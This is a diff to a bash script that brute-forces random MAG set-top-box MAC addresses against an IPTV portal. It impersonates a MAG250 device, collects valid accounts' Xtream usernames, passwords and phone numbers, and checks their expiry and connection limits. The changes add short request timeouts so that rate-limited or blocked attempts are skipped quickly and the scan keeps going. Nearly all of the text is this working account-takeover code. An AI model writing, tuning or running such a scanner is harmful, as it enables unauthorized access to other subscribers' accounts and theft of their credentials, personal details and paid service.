@@ -22,6 +22,9 @@ else
 fi
 
 UA="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG250 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
+# Very-low per-request timeout: blocked/ratelimited IPs hang ~12s before closing;
+# fail fast and ignore such responses instead of stalling workers.
+SCAN_TIMEOUT=2
 
 printf 'Checking portal connectivity... '
 http_code=$(curl -s -o /dev/null -w "%{http_code}" -L --max-time 10 \
@@ -62,24 +65,24 @@ scan_mac() {
 
     MAC="00:1A:79:${hex[RANDOM%16]}${hex[RANDOM%16]}:${hex[RANDOM%16]}${hex[RANDOM%16]}:${hex[RANDOM%16]}${hex[RANDOM%16]}"
 
-    response=$(curl -s -i \
+    response=$(curl -s -i --max-time $SCAN_TIMEOUT \
       -H "User-Agent: $UA" \
       -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
       "$URL/portal.php?type=stb&action=handshake&JsHttpRequest=1-xml")
     token=$(echo "$response" | $GREP -oP '(?<="token":")[^"]*')
 
-    curl -s -o /dev/null \
+    curl -s -o /dev/null --max-time $SCAN_TIMEOUT \
       -H "User-Agent: $UA" \
       -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
       -H "Authorization: Bearer $token" \
       "$URL/portal.php?type=stb&action=get_profile&auth_second_step=1&hw_version_2=1635b1c3e68859923ab3bb72192e089f66e7dd9e&JsHttpRequest=1-xml"
 
+    # 000 / non-200 handshake (blocked, ratelimited, ...): ignore, try next MAC
     if ! echo "$response" | $GREP -q "200"; then
-      progress "scanning: $MAC ${RED}[connection failed, ratelimited?]${RESET}"
       continue
     fi
 
-    genres=$(curl -s \
+    genres=$(curl -s --max-time $SCAN_TIMEOUT \
       -H "User-Agent: $UA" \
       -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
       -H "Authorization: Bearer $token" \
@@ -90,14 +93,14 @@ scan_mac() {
       continue
     fi
 
-    main_info=$(curl -s \
+    main_info=$(curl -s --max-time $SCAN_TIMEOUT \
       -H "User-Agent: $UA" \
       -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
       -H "Authorization: Bearer $token" \
       "$URL/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml")
     mac_phone=$(echo "$main_info" | jq -r '.js | "\(.mac) [\(.phone)]"')
 
-    ffplay=$(curl -s \
+    ffplay=$(curl -s --max-time $SCAN_TIMEOUT \
       -H "User-Agent: $UA" \
       -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
       -H "Authorization: Bearer $token" \
@@ -107,26 +110,26 @@ scan_mac() {
     xtreamuser=$(echo "$ffplay" | awk -F/ '{print $4}')
     xtreampw=$(echo "$ffplay" | awk -F/ '{print $5}')
 
-    check=$(curl -s "$URL/player_api.php?username=$xtreamuser&password=$xtreampw" | jq -r '.user_info')
+    check=$(curl -s --max-time $SCAN_TIMEOUT "$URL/player_api.php?username=$xtreamuser&password=$xtreampw" | jq -r '.user_info')
     exp_date=$(echo "$check" | jq -r '.exp_date')
     max_connections=$(echo "$check" | jq -r '.max_connections')
     active_cons=$(echo "$check" | jq -r '.active_cons')
 
-    live=$(curl -s \
+    live=$(curl -s --max-time $SCAN_TIMEOUT \
       -H "User-Agent: $UA" \
       -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
       -H "Authorization: Bearer $token" \
       "$URL/portal.php?type=itv&action=get_ordered_list&genre=*&fav=0&sortby=name&p=1&JsHttpRequest=1-xml" \
       | jq -r 'try (.js.total_items // .js[0].total_items) // 0' 2>/dev/null)
 
-    vod=$(curl -s \
+    vod=$(curl -s --max-time $SCAN_TIMEOUT \
       -H "User-Agent: $UA" \
       -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
       -H "Authorization: Bearer $token" \
       "$URL/portal.php?type=vod&action=get_ordered_list&category=*&sortby=added&fav=0&p=1&JsHttpRequest=1-xml" \
       | jq -r 'try (.js.total_items // .js[0].total_items) // 0' 2>/dev/null)
 
-    series=$(curl -s \
+    series=$(curl -s --max-time $SCAN_TIMEOUT \
       -H "User-Agent: $UA" \
       -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
       -H "Authorization: Bearer $token" \
